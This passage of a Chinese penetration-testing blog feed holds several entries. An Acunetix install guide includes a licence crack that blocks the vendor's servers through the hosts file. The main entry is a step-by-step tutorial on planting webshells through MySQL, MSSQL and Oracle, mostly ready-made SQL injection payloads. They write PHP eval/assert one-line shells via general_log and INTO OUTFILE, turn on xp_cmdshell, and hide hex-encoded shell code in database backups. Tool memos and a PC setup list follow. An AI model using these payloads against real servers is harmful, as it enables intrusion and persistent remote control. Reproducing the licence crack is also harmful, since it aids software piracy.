<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#更改名称</span><br><span class="line">mv acunetix_14.7.220322147_x64.sh acunetix.sh</span><br><span class="line">chmod +x acunetix.sh</span><br><span class="line">#破解</span><br><span class="line">mv license_info.json wa_data.dat /home/acunetix/.acunetix/data/license/</span><br><span class="line">vi /etc/hosts</span><br><span class="line">#添加以下内容</span><br><span class="line">127.0.0.1 updates.acunetix.com</span><br><span class="line">127.0.0.1 erp.acunetix.com</span><br><span class="line">#放行端口</span><br><span class="line">ufw allow 3443</span><br><span class="line">#执行</span><br><span class="line">./acunetix.sh</span><br></pre></td></tr></table></figure>

<p>进入用户协议，可以按 <code>crtl+c</code> 结束阅读，然后一路安装下去，同意用户协议，程序开始安装，按照顺序会让你设置hostname，Email，PSW<br>hostname可以使用默认的，直接回车，设置登录邮箱，密码，安装完成后会显示端口号</p>
<p>然后去浏览器访问 <code>https://ip:3443</code> 即可</p>
<p>awvs 管理命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl s acunetix.service</span><br></pre></td></tr></table></figure>



<h2 id="联动awvs和goby"><a href="#联动awvs和goby" class="headerlink" title="联动awvs和goby"></a>联动awvs和goby</h2><p>goby 安装插件 awvs，在 goby 设置处填写 awvs 的地址和 api</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/vps部署和联动goby和awvs/image-20220501115301271.png" alt="image-20220501115301271" style="zoom:50%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/vps部署和联动goby和awvs/image-20220501115402961.png" alt="image-20220501115402961" style="zoom:50%;" />

<p>扫描设置，将网卡设置为 <code>auto</code> 。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/vps%E9%83%A8%E7%BD%B2%E5%92%8C%E8%81%94%E5%8A%A8goby%E5%92%8Cawvs/image-20220501115545010.png" alt="image-20220501115545010"></p>
<p>服务器管理处添加 goby 的 vps 地址</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/vps部署和联动goby和awvs/image-20220501115657848.png" alt="image-20220501115657848" style="zoom:50%;" />

<p>然后再 <code>web 检测</code> 处可以进行 awvs 扫描</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/vps部署和联动goby和awvs/image-20220501115854500.png" alt="image-20220501115854500" style="zoom:50%;" />

<p>在扩展程序处点击 awvs 可以看到扫描队列</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/vps部署和联动goby和awvs/image-20220501120050126.png" alt="image-20220501120050126" style="zoom:50%;" />

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果你的 vps 不够稳定，那么可能 goby 会经常断线，十分头疼。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>三大数据库写webshell正确姿势</title>
    <url>/posts/ffe60f3c.html</url>
    <content><![CDATA[<blockquote>
<p>参考文章：</p>
<p><a href="https://forum.butian.net/share/362">https://forum.butian.net/share/362</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/178866188">https://zhuanlan.zhihu.com/p/178866188</a></p>
<p>两篇文章总结归纳为这篇文章，其中 Mysql 可以看第一篇文章，Mssql 和 Oracle 可以看第二篇文章。</p>
<p>因为是总结的，所以有些地方可能有纰漏，如果遇到问题，还请自行判断和解决。</p>
</blockquote>
<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><h2 id="基本条件"><a href="#基本条件" class="headerlink" title="基本条件"></a>基本条件</h2><ol>
<li>对web目录有写权限，一般 MS 系统都有，但 Linux 系统一般都是rwxr-xr-x，组跟其他用户都没有权限写操作</li>
<li>知道物理路径</li>
<li>数据库的当前用户为ROOT或拥有FILE权限</li>
<li>PHP的GPC参数为off状态</li>
</ol>
<h2 id="日志写马"><a href="#日志写马" class="headerlink" title="日志写马"></a>日志写马</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
<li><p>全局变量<code>general_log</code>为ON</p>
</li>
<li><p>需要<code>secure_file_priv</code>为空,即<code>secure_file_priv=&quot;&quot;</code>。</p>
</li>
<li><p>或<code>secure_file_priv=&quot;D:\&quot;</code>,指定为D盘的的情况下，web搭建的盘也必须是在D盘。</p>
</li>
<li><p><code>secure_file_priv</code> 一定不能为 Null</p>
</li>
</ol>
<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p><code>general_log</code>指的是日志保存状态，一共有两个值（ON&#x2F;OFF）ON代表开启 OFF代表关闭,但是可以通过sql查询设置为 ON</p>
<p>secure_file_priv&#x3D;”” 就是可以into outfile写入任意磁盘文件。</p>
<p>secure_file_priv设置通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量</p>
<p>知道物理路径（into outfile ‘物理路径’), 这样才能写对目录。</p>
<p>写入路径的时候，其中路径里的<code>\</code>用<code>\\</code>或者&#x2F;代替，因为<code>\</code>的话会消失一个</p>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>1.先设置<code>general_log</code>为on：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/?id=-1&#x27; union select 1,2,3;set global general_log=&#x27;on&#x27;;--+</span><br></pre></td></tr></table></figure>

<p>2.再设置<code>general_log_file</code>为一个php后缀文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/?id=-1&#x27; union select 1,2,3;set global general_log_file=&#x27;D:\\phpStudy\\PHPTutorial\\WWW\\log.php&#x27;;--+</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>直接访问<code>http://ip/?id=&lt;?php assert($_POST[v]);?&gt;;</code>，因为sql语句不管对错日志都会记录</p>
</li>
<li><p>webshell 工具连接 <code>http://ip/log.php</code></p>
</li>
</ol>
<p><strong>直接登录进别人的数据库的时候：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log_file=<span class="string">&#x27;D:/phpStudy/PHPTutorial/WWW/1.log&#x27;</span>;</span><br><span class="line"></span><br><span class="line">select <span class="string">&#x27;&lt;?php assert($_POST[v]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>查看数据库日志的具体位置，webshell 工具直接连接。</p>
<h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><ol>
<li>查看 <code>general_log</code>的状态和 log 文件的位置</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql&gt; show <span class="keyword">global</span> variables like <span class="string">&quot;%general_log%&quot;</span>;</span><br><span class="line">+------------------+--------------------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                                  |</span><br><span class="line">+------------------+--------------------------------------------------------+</span><br><span class="line">| general_log      | OFF                                                    |</span><br><span class="line">| general_log_file | D:\phpStudy\PHPTutorial\MySQL\data\DESKTOP-UQAMJKA.log |</span><br><span class="line">+------------------+--------------------------------------------------------+</span><br><span class="line"><span class="number">2</span> rows in <span class="title function_ invoke__">set</span> (<span class="number">0.02</span> sec)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>设置数据库日志的具体到web目录那里：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql&gt; set <span class="keyword">global</span> general_log_file=<span class="string">&#x27;D:/phpStudy/PHPTutorial/WWW/1.log&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> rows <span class="title function_ invoke__">affected</span> (<span class="number">0.07</span> sec)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>检查当前用户是否具备写权限:</li>
</ol>
<p>select user,file_priv from mysql.user;</p>
<p>确认其用户的值为Y即代表此用户拥有文件写入权限。</p>
<h2 id="mysql-into-outfile注射一句话木马"><a href="#mysql-into-outfile注射一句话木马" class="headerlink" title="mysql into outfile注射一句话木马"></a>mysql into outfile注射一句话木马</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><ol>
<li>mysql用户拥有file_priv权限</li>
</ol>
<p><code>show global variables like &#39;%secure%&#39;</code>;查看into outfile可以写入的磁盘。<br>（1）当secure_file_priv为空，就可以写入磁盘的目录。<br>（2）当secure_file_priv为G:\，就可以写入G盘的文件。<br>（3）当secure_file_priv为null，into outfile就不能写入文件。（注意NULL不是我们要的空，NULL和空的类型不一样）</p>
<ol start="2">
<li>能够使用union、或者有堆叠注入、或者已经成功登录到别人的数据库里了</li>
</ol>
<p>（1）能够使用union 。（需要mysql 3以上的版本）这个条件是在url里才需要，如果直接登录进别人的数据库，那么就不需要能够使用union了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">例子：</span><br><span class="line">?id=<span class="number">1</span> union select <span class="string">&#x27;&lt;?php @e val($_POST[&#x27;</span>c<span class="string">&#x27;]);?&gt;&#x27;</span> into outfile <span class="string">&quot;C:/phpStudy/WWW/a.php&quot;</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27;)) UNION SELECT 1,2,&#x27;</span><span class="meta">&lt;?php</span> @e <span class="title function_ invoke__">val</span>(<span class="variable">$_POST</span>[<span class="string">&quot;v&quot;</span>]);<span class="meta">?&gt;</span><span class="string">&#x27; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\hack.php&quot; --+</span></span><br></pre></td></tr></table></figure>

<p>（2）或者有堆叠注入，就可以直接<code>?id=1;select &#39;&lt;?php @e val($_POST[&#39;c&#39;]);?&gt;&#39; into outfile &quot;C:/phpStudy/WWW/a.php&quot;</code>这样执行了。</p>
<p>不过首先要想有堆叠注入的条件，源码中必须要用到<code>mysqli_multi_query()</code>，那么我们此处就可以执行多个sql语句进行注入。一般后台查询数据库使用的语句都是用<code>mysql_query()</code>，所以堆叠注入在mysql上不常见。<code>mysqli_multi_query()</code>可以执行多个sql语句，而<code>mysqli_query()</code>只能执行一个sql语句。</p>
<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p>（3）再者就是已经成功登录到别人的数据库里了，直接执行<code>select &#39;&lt;?php @e val($_POST[&#39;c&#39;]);?&gt;&#39; into outfile &quot;C:/phpStudy/WWW/a.php&quot;</code></p>
<h3 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h3><p><strong>Union 注入法</strong></p>
<p>1.判断注入类型</p>
<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;</code> 报错<br><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) --+</code> 正常</p>
<p>2.判断列数</p>
<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) order by 3 --+</code> 正常</p>
<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) order by 4 --+</code> 报错</p>
<p>说明存在3列</p>
<p>3.文件写入</p>
<p>1.判断注入类型</p>
<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;</code> 报错<br><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) --+</code> 正常</p>
<p>2.判断列数</p>
<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) order by 3 --+</code> 正常</p>
<p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) order by 4 --+</code> 报错</p>
<p>说明存在3列</p>
<p>3.文件写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-7?id=1&#x27;)) UNION SELECT 1,2,&#x27;&lt;?php @e val($_POST[&quot;v&quot;]);?&gt;&#x27; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\hack.php&quot; --+</span><br></pre></td></tr></table></figure>

<p>或者<code>&quot;D:/phpStudy/PHPTutorial/WWW/hack.php&quot;</code>，就是不能<code>\</code>，经过测试这样导入不成功。</p>
<p><strong>堆叠注入法：</strong></p>
<p>堆叠注入：<code>http://127.0.0.1/sqli-labs-master/Less-40/?id=1&#39;);SELECT &#39;&lt;?php @e val($_POST[&quot;v&quot;]);?&gt;&#39; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\hack.php&quot;;--+</code></p>
<p><strong>直接登录数据库法：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SELECT <span class="string">&quot;&lt;?php @e val(<span class="subst">$_POST</span>[&#x27;xiaohua&#x27;]); ?&gt;&quot;</span></span><br><span class="line">INTO OUTFILE <span class="string">&#x27;/tmp/test1.php&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后就可以用 webshell 管理工具连接了。</p>
<hr>
<h1 id="Mssql"><a href="#Mssql" class="headerlink" title="Mssql"></a>Mssql</h1><h2 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h2><ol>
<li>有相应的权限db_owner</li>
<li>获得Web目录的绝对路径</li>
</ol>
<h2 id="写入webshell方法"><a href="#写入webshell方法" class="headerlink" title="写入webshell方法"></a>写入webshell方法</h2><p>利用xp_cmdshell命令、<br>差异备份写入shell、<br>log备份写入shell。</p>
<h2 id="使用XP-cmdshel写入Webshell"><a href="#使用XP-cmdshel写入Webshell" class="headerlink" title="使用XP_cmdshel写入Webshell"></a>使用XP_cmdshel写入Webshell</h2><p>首先我们需要查找网站目录的绝对路径，查找绝对路径的方法有5种：<br>通过报错信息查找；<br>通过目录爆破猜解；<br>通过旁站的目录确定；<br>通过存储过程来搜索；<br>通过读取配置文件查找。</p>
<p>其中通过存储过程来搜索，SQLServer提供了两种方法：<strong>xp_cmdshell</strong> 和 <strong>xp_dirtree</strong>，一般需要手动开启。<br>命令<code>execute master…xp_dirtree ‘c:’;</code>可以查出所有c:\下的文件、目录、子目录。</p>
<p>查找网站目录的绝对路径<br>在真实环境中时，我们执行execute可能并不能得到回显信息，但我们可以在注入点处新建一张表，然后将xp_dirtree查询到的信息插入其中，再查询这张表即可得相应的绝对路径了。</p>
<p><strong>开启 xp_cmdshell</strong></p>
<p>Xp_cmdshell是一个更为有效的查询绝对路径的函数，但是目前已经被SQLServer默认关闭了，但我们可以使用如下命令启用这个选项。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure ‘show advanced options’,1;//允许修改高级参数RECONFIGURE;</span><br><span class="line">EXEC sp_configure ‘xp_cmdshell’,1;//打开xp_cmdshell扩展RECONFIGURE;</span><br></pre></td></tr></table></figure>

<p>未能找到存储过程 ‘master..xp_cmdshell’<br>第一步执行：EXEC sp_addextendedproc xp_cmdshell,@dllname &#x3D;’xplog70.dll’declare @o int<br>第二步执行：sp_addextendedproc ‘xp_cmdshell’,’xpsql70.dll’</p>
<p>开启了xp_cmsshell之后我们就可以执行CMD命令了，例如:<br>for &#x2F;r c:%i in (1*.php) do @echo %i<br>就可以查询c:\目录下的所有符合1*.php的文件，同理，在实际应用中，我们也是新建一个表，并将xp_cmdshell查询到的信息插入后，再次查询即可。</p>
<p><strong>使用xp_cmdshell写入WebShell</strong><br>我们可以通过xp_cmdshell执行系统CMD命令，例如我们可以使用CMD中的echo命令，将WebShell的代码写入到网站目录下<br>PAYLOAD：1’;execmaster..xp_cmdshell’echo^&gt;F:\PhpStudy20180211\PHPTutorial\WWW\cmd.php’;</p>
<h2 id="使用差异备份写入WebShell"><a href="#使用差异备份写入WebShell" class="headerlink" title="使用差异备份写入WebShell"></a>使用差异备份写入WebShell</h2><blockquote>
<p>实战参考：<a href="https://www.bianchengquan.com/article/198173.html">https://www.bianchengquan.com/article/198173.html</a></p>
<p>如果能直接使用xp_cmdshell就尽量不要使用差异备份，因为会产生备份文件，如果数据库很大的话，会造成影响</p>
</blockquote>
<p>首先对某一数据库进行备份。<br>PAYLOAD：id&#x3D;1’;backup database 库名 to disk&#x3D;‘F:\PhpStudy20180211\PHPTutorial\WWW\back.bak’;</p>
<p><strong>数据库备份</strong><br>其次将WebShell代码写入数据库中,<br>PAYLOAD：id&#x3D;1’; create table cybk([cmd][image]);#创建一个新表<br>PAYLOAD：id&#x3D;1’;insert into cybk(cmd)<br>vaues(0x3C3F706870206576616C28245F504F53545B2770617373275D293B203F3E);</p>
<p>#将WebShell的代码转换成ASCII码</p>
<p>最后将此数据库进行差异备份，这样其中就会包含刚刚写入的WebShell代码。<br>PAYLOAD：id&#x3D;1’; backup database library to disk&#x3D;’F:\PhpStudy20180211\PHPTutorial\WWW\cybk.php’ WITHDIFFERENTIAL,FORMAT;</p>
<h2 id="使用log备份写入WebShell"><a href="#使用log备份写入WebShell" class="headerlink" title="使用log备份写入WebShell"></a>使用log备份写入WebShell</h2><p>使用Log备份写入WebShell的要求是他的数据库已经备份过，而且要选择完整模式的恢复模式，相比较差异备份而言，使用Log备份文件会小的多。<br>首先需要将数据库设置为完整恢复模式，然后创建一个新表，将WebShell用Ascii编码后写入其中，然后将该数据库的日志信息导出到Web目录，即可。</p>
<h1 id="ORACLE"><a href="#ORACLE" class="headerlink" title="ORACLE"></a>ORACLE</h1><h2 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a>条件</h2><ol>
<li><p>有DBA权限</p>
</li>
<li><p>获得Web目录的绝对路径</p>
</li>
</ol>
<h2 id="Oracle写入webshell"><a href="#Oracle写入webshell" class="headerlink" title="Oracle写入webshell"></a>Oracle写入webshell</h2><p>首先我们需要创建一个ORACLE的目录对象指向某一路径，在真实环境中需要指向Web目录下，在这里我们将其指向&#x2F;home&#x2F;oracle这一路径下。create or replace directory IST0_DIR as ‘&#x2F;home&#x2F;oracle’;</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%B8%89%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%99webshell%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/v2-6abcd86d728afd5c70f1b8fcebd8ac2a_1440w.jpg" alt="img"></p>
<p>创建好后，我们需要对其进行一下授权过程，让其能够顺利的写入WebShell代码。</p>
<p>grant read, write on directory IST0_DIR tosystem;</p>
<p>然后写入文件，定义变量类型为utl_file.file_type，然后将WebShell的代码写入此文件中。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%B8%89%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%99webshell%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/v2-b460fa9dc96c7a17da878043105de004_1440w.jpg" alt="img"></p>
<p>直接访问该文件，即可查看到其中的WebShell代码，如果这个文件是放置在Web目录下的，那么就可以被攻击者成功利用。</p>
<p>以上就是三大数据库（MySQL、SqlServer、Oracle）写入WebShell的正确姿势</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>技术虽然比较旧，但是算是面试会被经常问到的问题，应该去总结和实验。</p>
<p>如果可以获取到数据库的用户名和密码的话，就可以直接用工具 MDUT 来进行管理数据库了。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Sql</tag>
      </tags>
  </entry>
  <entry>
    <title>个人备忘录007</title>
    <url>/posts/4fdc8cf6.html</url>
    <content><![CDATA[<h2 id="工具命令"><a href="#工具命令" class="headerlink" title="工具命令"></a>工具命令</h2><h3 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webscan --listen 127.0.0.1:7777 --html-output xray-testphp.html</span><br><span class="line"></span><br><span class="line">webscan --basic-crawler http://testphp.vulnweb.com/ --html-output xray-crawler-testphp.html</span><br><span class="line"></span><br><span class="line">servicescan --target 127.0.0.1:8009 --html-output service.html</span><br><span class="line"></span><br><span class="line">servicescan --target-file 1.file --html-output service.html</span><br><span class="line"></span><br><span class="line">webscan --browser-crawler http://example.com --html-output vuln.html</span><br></pre></td></tr></table></figure>

<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd -p 3443:3443 xrsec/awvs</span><br><span class="line">docker ps -a</span><br><span class="line">docker ps -q</span><br><span class="line">docker stop pid</span><br><span class="line">docker stop $(docker ps -q)</span><br><span class="line">docker rm -f pid</span><br><span class="line">docker rm $(docker ps -aq)</span><br><span class="line">docker stop $(docker ps -q) &amp; docker rm -f $(docker ps -aq)</span><br><span class="line">docker rmi aw</span><br></pre></td></tr></table></figure>



<h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git fetch origin main:tmp</span><br><span class="line">git merge tmp</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;my commit&quot;</span><br><span class="line">git remote add origin git@github.com:ccc-f/fsafe.git</span><br><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure>



<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br><span class="line">CONFIG SET requirepass &quot;123456&quot;</span><br><span class="line">auth 123456</span><br></pre></td></tr></table></figure>



<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="打开IE浏览器"><a href="#打开IE浏览器" class="headerlink" title="打开IE浏览器"></a>打开IE浏览器</h3><p>openie.vbs</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CreateObject(&quot;InternetExplorer.Application&quot;).Visible=true</span><br></pre></td></tr></table></figure>



<h3 id="adb"><a href="#adb" class="headerlink" title="adb"></a>adb</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nox_adb connect 127.0.0.1:62001</span><br></pre></td></tr></table></figure>



<h3 id="pip操作"><a href="#pip操作" class="headerlink" title="pip操作"></a>pip操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip freeze &gt; requirements.txt</span><br></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">header=&quot;https://account.jetbrains.com/fls-auth&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>个人网安pc配置清单</title>
    <url>/posts/add57331.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想换电脑了，这台电脑已经不太能继续走下去了，8g+256g的笔记本，只能勉强开三四个虚拟机，而且电脑存储也快耗尽了，电脑文件的结构也很混乱。</p>
<h2 id="配置清单"><a href="#配置清单" class="headerlink" title="配置清单"></a>配置清单</h2><h3 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h3><p>惠普战66五代 32g+512g+2t(sn740)</p>
<p>图吧工具箱验机</p>
<p><a href="http://www.tbtool.cn/">http://www.tbtool.cn/</a></p>
<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><p>修改默认存储位置，关闭睡眠（比不睡眠耗电）</p>
<p>win11右键菜单恢复win10 <a href="http://www.winwin7.com/JC/22135.html">http://www.winwin7.com/JC/22135.html</a></p>
<p>改变鼠标颜色</p>
<p>host文件</p>
<blockquote>
<p>142.250.0.90 translate.googleapis.com</p>
</blockquote>
<h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h3><p>文件夹的结构就像Linux一样，每个文件夹都有它存在的意义。</p>
<p>所需文件夹都放在<code>D:\Users\</code>下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">env \python \nodejs \java</span><br><span class="line">program</span><br><span class="line">download \packages \imgs </span><br><span class="line">tmp:\30 \180 \365</span><br><span class="line">company \projects \files \tools</span><br><span class="line">game</span><br><span class="line">project \myblog \python \java</span><br><span class="line">school</span><br><span class="line">archive \文件名（描述+时间）</span><br></pre></td></tr></table></figure>



<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p><strong>Python</strong></p>
<blockquote>
<p><a href="https://www.python.org/ftp/python/3.8.10/python-3.8.10-amd64.exe">https://www.python.org/ftp/python/3.8.10/python-3.8.10-amd64.exe</a></p>
</blockquote>
<p><strong>Java（免安装版）</strong></p>
<blockquote>
<p><a href="https://cowtransfer.com/s/71cf22ee780c40">https://cowtransfer.com/s/71cf22ee780c40</a> 解压密码 java </p>
<p>环境变量配置 <a href="https://blog.csdn.net/qq_48988285/article/details/125593715">https://blog.csdn.net/qq_48988285/article/details/125593715</a></p>
</blockquote>
<p><strong>Git</strong></p>
<blockquote>
<p><a href="https://blog.csdn.net/Wmeihua/article/details/123257553">https://blog.csdn.net/Wmeihua/article/details/123257553</a></p>
</blockquote>
<p><strong>adb</strong></p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_69681418/article/details/125995030">https://blog.csdn.net/weixin_69681418/article/details/125995030</a></p>
</blockquote>
<p><strong>Node.js v14.18.1、npm 6.14.15、cnpm</strong></p>
<blockquote>
<p><a href="https://blog.csdn.net/qq_48485223/article/details/122709354">https://blog.csdn.net/qq_48485223/article/details/122709354</a></p>
</blockquote>
<h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><h4 id="必备"><a href="#必备" class="headerlink" title="必备"></a>必备</h4><p><strong>腾讯软件中心独立版</strong></p>
<blockquote>
<p>大部分软件都可以在这下</p>
<p><a href="https://pc.qq.com/">https://pc.qq.com/</a></p>
<p>网易云</p>
<p>微信</p>
<p>QQ</p>
<p>钉钉</p>
<p>potPlayer</p>
<p>EasyConnect</p>
<p>Git</p>
<p>Proxifier</p>
<p>utools</p>
<p>idm</p>
<p>7zip</p>
<p>steam</p>
<p>vscode</p>
<p>vmware workstation pro</p>
<p>chrome</p>
<p>wegame</p>
</blockquote>
<p><strong>密码管理软件 Bitwarden</strong></p>
<blockquote>
<p><a href="https://bitwarden.com/">https://bitwarden.com/</a></p>
</blockquote>
<p><strong>Chrome：</strong></p>
<blockquote>
<p>插件：</p>
<p>OneTab</p>
<p>Infinity 新标签页 (Pro)</p>
<p>Adblock Plus - 免费的广告拦截器</p>
<p>Octotree - GitHub code tree</p>
<p>Proxy SwitchyOmega</p>
<p>tampermonkey</p>
</blockquote>
<h4 id="效率"><a href="#效率" class="headerlink" title="效率"></a>效率</h4><p><strong>IDM绿色版+油猴</strong></p>
<p>多线程下载</p>
<blockquote>
<p><a href="https://blog.csdn.net/u011463397/article/details/121167183">https://blog.csdn.net/u011463397/article/details/121167183</a></p>
</blockquote>
<p><strong>alist</strong></p>
<p>挂载网盘的工具</p>
<blockquote>
<p><a href="https://alist.nn.ci/zh/guide/install/manual.html">https://alist.nn.ci/zh/guide/install/manual.html</a></p>
</blockquote>
<p><strong>uTools</strong></p>
<p>生产力效率工具</p>
<blockquote>
<p><a href="https://www.u.tools/">https://www.u.tools/</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">备忘快贴</span><br><span class="line">Todo</span><br><span class="line">hosts切换</span><br><span class="line">悬浮</span><br><span class="line">ocr</span><br><span class="line">文本代码对比</span><br><span class="line">代码转图片</span><br></pre></td></tr></table></figure>

<p><strong>7-Zip</strong></p>
<p>最好用的解压缩工具</p>
<blockquote>
<p><a href="https://www.7-zip.org/">https://www.7-zip.org/</a></p>
</blockquote>
<p><strong>DBeaver</strong></p>
<p>数据库连接</p>
<blockquote>
<p><a href="https://github.com/dbeaver/dbeaver/releases">https://github.com/dbeaver/dbeaver/releases</a></p>
</blockquote>
<p><strong>window terminal、Notepads</strong></p>
<p>microsoft Store下载</p>
<blockquote>
<p>背景图片暗色系：</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%B8%AA%E4%BA%BA%E7%94%B5%E8%84%91%E9%85%8D%E7%BD%AE%E6%B8%85%E5%8D%95/image-20221011172504300.png" alt="image-20221011172504300"></p>
<p>原图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E4%B8%AA%E4%BA%BA%E7%94%B5%E8%84%91%E9%85%8D%E7%BD%AE%E6%B8%85%E5%8D%95/01.jpg" alt="01"></p>
<h4 id="加速"><a href="#加速" class="headerlink" title="加速"></a>加速</h4><p><strong>Watt Toolkit</strong></p>
<blockquote>
<p><a href="https://steampp.net/">https://steampp.net/</a></p>
</blockquote>
<p><strong>Clash</strong></p>
<blockquote>
<p>客户端 <a href="https://www.ermao.net/uncategorized/clash-for-windows/">https://www.ermao.net/uncategorized/clash-for-windows/</a></p>
